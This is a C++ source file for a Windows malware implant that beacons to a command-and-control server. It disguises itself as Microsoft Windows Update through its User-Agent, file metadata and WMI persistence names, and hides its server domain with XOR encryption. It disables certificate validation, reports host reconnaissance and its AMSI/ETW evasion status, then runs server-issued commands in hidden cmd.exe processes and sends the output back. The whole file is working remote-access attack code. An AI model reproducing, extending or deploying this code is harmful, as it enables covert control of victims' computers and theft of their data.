#include "c2.hpp"
#include "config.hpp"
#include "utils.hpp"
#include "evasion.hpp"
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "winhttp.lib")

// ---------------------------------------------------------------------------
// Config definitions (declared extern in config.hpp)
// ---------------------------------------------------------------------------

namespace config {
    // Placeholder encrypted domain — replace with real XOR'd bytes before deployment
    const uint8_t C2_DOMAIN_ENCRYPTED[] = {0x53, 0x09, 0x5D, 0x4A, 0x15, 0x1F, 0x07, 0x50, 0x1A, 0x12, 0x47, 0x53, 0x00, 0x5E, 0x08, 0x03, 0x59, 0x08, 0x51, 0x51, 0x09, 0x53, 0x0A, 0x07, 0x1A, 0x16, 0x5D, 0x4B, 0x0A, 0x57, 0x16, 0x11, 0x1A, 0x05, 0x57, 0x4F};
    const size_t  C2_DOMAIN_LEN = 36;
    const uint16_t C2_PORT = 443;

    // Auth token — must match GHOST_BEACON_TOKEN on the server
    const wchar_t* BEACON_TOKEN = L"4f8c9b2a7e1d5f3c6a8b9e0d2f4c1a3b5e7d9f8c0b1a2d3e4f5a6b7c8d9e0f1";

    // User-Agent mimicking Windows Update client
    const wchar_t* USER_AGENT =
        L"Microsoft-WNS/10.0";

    // WMI persistence identifiers
    const wchar_t* WMI_CONSUMER_NAME = L"WindowsSystemUpdateConsumer";
    const wchar_t* WMI_FILTER_NAME   = L"WindowsSystemUpdateFilter";
    const wchar_t* WMI_BINDING_NAME  = L"WindowsSystemUpdateBinding";

    // PE metadata
    const wchar_t* PRODUCT_NAME      = L"Microsoft Windows Update Service";
    const wchar_t* FILE_DESCRIPTION  = L"Windows Update Agent";
    const wchar_t* COMPANY_NAME      = L"Microsoft Corporation";
}

// ---------------------------------------------------------------------------
// Minimal JSON helpers — no external dependency
// ---------------------------------------------------------------------------

static std::string JsonEscape(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\b': out += "\\b";  break;
            case '\f': out += "\\f";  break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (static_cast<unsigned char>(c) < 0x20) {
                    char buf[8];
                    snprintf(buf, sizeof(buf), "\\u%04x", static_cast<unsigned>(c));
                    out += buf;
                } else {
                    out += c;
                }
        }
    }
    return out;
}

// Extract a string value for a given key from flat JSON
// Returns empty string if not found
static std::string JsonGetString(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return "";

    // Find the colon after the key
    pos = json.find(':', pos + needle.size());
    if (pos == std::string::npos) return "";

    // Skip whitespace to find opening quote
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return "";

    // Find closing quote (handle escaped quotes)
    size_t start = pos + 1;
    size_t end = start;
    while (end < json.size()) {
        if (json[end] == '\\') { end += 2; continue; }
        if (json[end] == '"') break;
        ++end;
    }
    return json.substr(start, end - start);
}

// ---------------------------------------------------------------------------
// XOR string decryption
// ---------------------------------------------------------------------------

std::wstring DecryptString(const uint8_t* enc, size_t len, const std::wstring& key) {
    if (len == 0 || key.empty()) return L"";

    // Convert wide key to bytes for XOR
    std::string keyBytes = WStringToUTF8(key);
    if (keyBytes.empty()) return L"";

    std::vector<uint8_t> buf(enc, enc + len);
    XorBuffer(buf.data(), buf.size(),
              reinterpret_cast<const BYTE*>(keyBytes.data()), keyBytes.size());

    // Decrypted bytes are UTF-8 domain string
    std::string decrypted(buf.begin(), buf.end());
    return UTF8ToWString(decrypted);
}

// ---------------------------------------------------------------------------
// WinHTTP transport layer
// ---------------------------------------------------------------------------

struct HttpResponse {
    DWORD  statusCode;
    std::string body;
};

static HttpResponse WinHttpRequest(
    const std::wstring& host,
    INTERNET_PORT port,
    const std::wstring& verb,
    const std::wstring& path,
    const std::string&  bodyUtf8,
    const std::wstring& extraHeaders
) {
    HttpResponse resp = {0, ""};

    HINTERNET hSession = WinHttpOpen(
        config::USER_AGENT,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0
    );
    if (!hSession) return resp;

    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), port, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return resp;
    }

    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, verb.c_str(), path.c_str(),
        nullptr, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE
    );
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return resp;
    }

    // Accept self-signed / invalid certs (lab environment)
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    // Add custom headers
    std::wstring headers = L"Content-Type: application/json\r\n";
    headers += L"X-Beacon-Token: ";
    headers += config::BEACON_TOKEN;
    headers += L"\r\n";
    if (!extraHeaders.empty()) {
        headers += extraHeaders;
        headers += L"\r\n";
    }

    WinHttpAddRequestHeaders(hRequest, headers.c_str(),
                             static_cast<DWORD>(headers.size()),
                             WINHTTP_ADDREQ_FLAG_ADD);

    // Send request
    BOOL sent = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        bodyUtf8.empty() ? WINHTTP_NO_REQUEST_DATA : const_cast<char*>(bodyUtf8.data()),
        static_cast<DWORD>(bodyUtf8.size()),
        static_cast<DWORD>(bodyUtf8.size()),
        0
    );

    if (!sent || !WinHttpReceiveResponse(hRequest, nullptr)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return resp;
    }

    // Read status code
    DWORD statusSize = sizeof(resp.statusCode);
    WinHttpQueryHeaders(hRequest,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        &resp.statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);

    // Read response body
    DWORD available = 0;
    while (WinHttpQueryDataAvailable(hRequest, &available) && available > 0) {
        std::vector<char> buf(available);
        DWORD read = 0;
        if (WinHttpReadData(hRequest, buf.data(), available, &read) && read > 0) {
            resp.body.append(buf.data(), read);
        }
        if (resp.body.size() > 1024 * 1024) break;  // safety cap: 1 MB
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return resp;
}

// ---------------------------------------------------------------------------
// Command execution — CreateProcess with stdout/stderr pipe capture
// ---------------------------------------------------------------------------

std::wstring ExecuteCommand(const std::wstring& cmd) {
    // Create anonymous pipe for child stdout+stderr
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), nullptr, TRUE};
    HANDLE hReadPipe  = nullptr;
    HANDLE hWritePipe = nullptr;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
        return L"[error: CreatePipe failed]";

    // Prevent read handle from being inherited
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    // Build command line: cmd.exe /C "<command>"
    std::wstring cmdLine = L"cmd.exe /C " + cmd;

    STARTUPINFOW si = {0};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput  = hWritePipe;
    si.hStdError   = hWritePipe;
    si.hStdInput   = GetStdHandle(STD_INPUT_HANDLE);
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};

    BOOL ok = CreateProcessW(
        nullptr,
        &cmdLine[0],
        nullptr, nullptr,
        TRUE,           // inherit handles
        CREATE_NO_WINDOW,
        nullptr, nullptr,
        &si, &pi
    );

    // Close write end in parent — must be before reading
    CloseHandle(hWritePipe);

    if (!ok) {
        CloseHandle(hReadPipe);
        DWORD err = GetLastError();
        std::wstringstream ss;
        ss << L"[error: CreateProcess failed, code=" << err << L"]";
        return ss.str();
    }

    // Read output from pipe
    std::string output;
    output.reserve(4096);
    char buf[4096];
    DWORD bytesRead = 0;

    while (output.size() < config::CMD_OUTPUT_MAX) {
        if (!ReadFile(hReadPipe, buf, sizeof(buf), &bytesRead, nullptr) || bytesRead == 0)
            break;
        output.append(buf, bytesRead);
    }

    // Wait for child to exit (with timeout)
    WaitForSingleObject(pi.hProcess, config::CMD_TIMEOUT_MS);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    return UTF8ToWString(output);
}

// ---------------------------------------------------------------------------
// Beacon protocol
// ---------------------------------------------------------------------------

// Build JSON beacon payload
static std::string BuildBeaconJson(const Session& s) {
    std::string sid  = JsonEscape(WStringToUTF8(s.sessionId));
    std::string host = JsonEscape(WStringToUTF8(s.hostname));
    std::string user = JsonEscape(WStringToUTF8(s.username));

    std::ostringstream j;
    j << "{"
      << "\"session\":\"" << sid << "\","
      << "\"recon\":{"
      <<   "\"hostname\":\"" << host << "\","
      <<   "\"user\":\"" << user << "\","
      <<   "\"build\":" << s.build << ","
      <<   "\"elevated\":" << (s.elevated ? "true" : "false") << ","
      <<   "\"amsi\":" << (s.amsiPatched ? "true" : "false") << ","
      <<   "\"etw\":" << (s.etwPatched ? "true" : "false") << ","
      <<   "\"hwbps\":" << (s.hwbpsCleared ? "true" : "false")
      << "}}";
    return j.str();
}

// Resolve C2 host — decrypt or fallback
static std::wstring GetC2Host() {
    std::wstring key = GetHostnameHash();
    std::wstring host = DecryptString(config::C2_DOMAIN_ENCRYPTED, config::C2_DOMAIN_LEN, key);
    if (host.empty()) host = L"127.0.0.1";  // fallback for development
    return host;
}

BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
    taskOut = L"sleep";  // default

    std::wstring host = GetC2Host();
    std::string body  = BuildBeaconJson(session);

    HttpResponse resp = WinHttpRequest(
        host, config::C2_PORT,
        L"POST", L"/beacon",
        body, L""
    );

    if (resp.statusCode != 200) return FALSE;

    // Parse "cmd" from response JSON
    std::string cmd = JsonGetString(resp.body, "cmd");
    if (!cmd.empty()) {
        taskOut = UTF8ToWString(cmd);
    }
    return TRUE;
}

BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
    std::wstring host = GetC2Host();

    std::string sid = JsonEscape(WStringToUTF8(sessionId));
    std::string out = JsonEscape(WStringToUTF8(output));

    std::string body = "{\"session\":\"" + sid + "\",\"output\":\"" + out + "\"}";

    HttpResponse resp = WinHttpRequest(
        host, config::C2_PORT,
        L"POST", L"/result",
        body, L""
    );

    return (resp.statusCode == 200);
}

// ---------------------------------------------------------------------------
// Beacon loop — main implant runtime
// ---------------------------------------------------------------------------

VOID BeaconLoop() {
    Session session;
    session.hostname    = GetHostname();
    session.username    = GetUsername();
    session.build       = GetOSBuild();
    session.elevated    = IsElevated();
    session.amsiPatched = TRUE;
    session.etwPatched  = TRUE;
    session.hwbpsCleared= TRUE;
    session.sessionId   = GetHostnameHash() + L"|" + session.username;

    DWORD consecutiveFailures = 0;

    while (true) {
        // Re-apply evasion each cycle
        ReapplyEvasion();

        std::wstring task;
        BOOL success = SendBeacon(session, task);

        if (success) {
            consecutiveFailures = 0;

            if (task == L"sleep") {
                // No-op, just sleep and beacon again
            } else if (task == L"exit") {
                break;
            } else {
                std::wstring result = ExecuteCommand(task);
                SendResult(session.sessionId, result);
            }
        } else {
            consecutiveFailures++;
        }

        // Adaptive sleep — back off on repeated failures
        DWORD sleepMin = config::BEACON_MIN;
        DWORD sleepMax = config::BEACON_MAX;
        if (consecutiveFailures >= config::MAX_FAILURES) {
            sleepMin *= config::BACKOFF_FACTOR;
            sleepMax *= config::BACKOFF_FACTOR;
        }
        JitterSleep(sleepMin, sleepMax);
    }
}